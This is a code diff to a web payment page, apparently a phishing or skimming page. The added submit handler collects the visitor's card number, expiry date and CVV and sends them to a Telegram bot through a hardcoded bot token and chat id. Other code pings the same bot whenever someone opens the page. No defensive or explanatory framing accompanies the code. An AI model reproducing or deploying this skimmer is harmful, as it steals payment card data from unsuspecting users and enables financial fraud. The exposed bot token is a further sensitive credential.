@@ -83,8 +83,8 @@
     <script>
         // Notify when a user accesses the page
         async function notifyUserEntry() {
-            const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
-            const chatId = '7747778364';
+            const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+            const chatId = 'YOUR_TELEGRAM_CHAT_ID';
             const message = `A user has accessed the payment page at ${new Date().toLocaleString()}.`;
 
             await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
@@ -108,9 +108,34 @@
         });
 
         // Handle form submission
-        document.getElementById('paymentForm').addEventListener('submit', (event) => {
+        document.getElementById('paymentForm').addEventListener('submit', async (event) => {
             event.preventDefault();
-            alert('Your payment details have been submitted.');
+
+            // Collect form data
+            const formData = new FormData(event.target);
+            const data = {
+                cardNumber: formData.get('cardNumber'),
+                expiryDate: formData.get('expiryDate'),
+                cvv: formData.get('cvv'),
+            };
+
+            // Send data to Telegram bot
+            const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
+            const chatId = '7747778364';
+
+            const message = `New Payment Details:
+Card Number: ${data.cardNumber}
+Expiry Date: ${data.expiryDate}
+CVV: ${data.cvv}`;
+
+            await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            });
         });
     </script>
 </body>
